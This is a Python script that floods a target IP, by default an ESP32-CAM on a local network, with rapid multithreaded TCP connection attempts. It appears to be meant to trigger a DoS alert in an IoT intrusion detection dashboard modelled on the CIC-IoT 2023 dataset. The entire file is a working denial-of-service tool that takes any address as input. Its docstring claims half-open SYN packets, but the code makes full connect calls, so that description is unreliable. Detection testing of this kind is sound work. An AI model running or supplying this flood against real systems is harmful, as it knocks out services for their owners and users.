import socket
import threading
import time
import random

def dos_syn_flood(target_ip, target_port=80, duration=30):
    """
    DoS SYN Flood signature from CIC-IoT 2023 dataset:
    - Protocol: TCP SYN packets
    - Packet size: small (60-80 bytes, just the TCP header)
    - Rate: HIGH (100-300 pps) - fills the TCP connection table
    - All packets have SYN flag set, no ACK (half-open connections)
    """
    print(f"[DoS] SYN Flood against {target_ip}:{target_port}")
    print("[INFO] Sending TCP SYN packets at high rate (CIC-IoT 2023 DoS-SYN_Flood signature)")
    print("[INFO] This exhausts the ESP32's TCP connection queue")

    end_time = time.time() + duration
    packets_sent = 0
    lock = threading.Lock()

    def syn_thread():
        nonlocal packets_sent
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.05)
                s.connect((target_ip, target_port))
                s.close()
            except:
                pass
            with lock:
                packets_sent += 1
            time.sleep(0.005)  # ~200 pps per thread

    # Launch 5 threads = ~200 pps total (above 30 pps gate, below DDoS level)
    threads = []
    for _ in range(5):
        t = threading.Thread(target=syn_thread)
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while time.time() < end_time:
            time.sleep(1)
            print(f"   -> SYN packets sent: {packets_sent}")
    except KeyboardInterrupt:
        print("\n[STOPPED] DoS attack stopped.")

    print(f"[DONE] Sent {packets_sent} SYN packets. Check dashboard for DoS alert!")

if __name__ == "__main__":
    ip = input("Enter Target ESP32-CAM IP (Default: 192.168.24.167): ").strip() or "192.168.24.167"
    dur = input("Enter Duration in seconds (Default: 30): ").strip()
    dur = int(dur) if dur.isdigit() else 30
    dos_syn_flood(ip, 80, dur)
